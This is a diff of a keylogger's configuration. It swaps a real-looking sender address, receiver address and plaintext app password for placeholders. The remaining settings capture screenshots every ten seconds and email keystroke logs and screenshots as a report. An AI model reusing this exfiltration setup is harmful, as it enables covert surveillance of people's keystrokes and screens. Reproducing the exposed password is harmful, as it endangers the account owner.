@@ -15,9 +15,9 @@ record_file = '/Users/mehmetsalihogun/Desktop/Projeler/BSG/keylogger/'
 screenshot_enabled = True
 time_ss = 10
 
-sender_email = 'ogunmehmetsalih@hotmail.com'
-receiver_email = 'keyloggerbsg@gmail.com'
-app_password = '1832.Mso'
+sender_email = '..'
+receiver_email = '..'
+app_password = '..'
 subject = 'Keylogger Rapor'
 body = 'Keylogger kayıtları ve ekran görüntüleri ektedir.'
 attachments = []
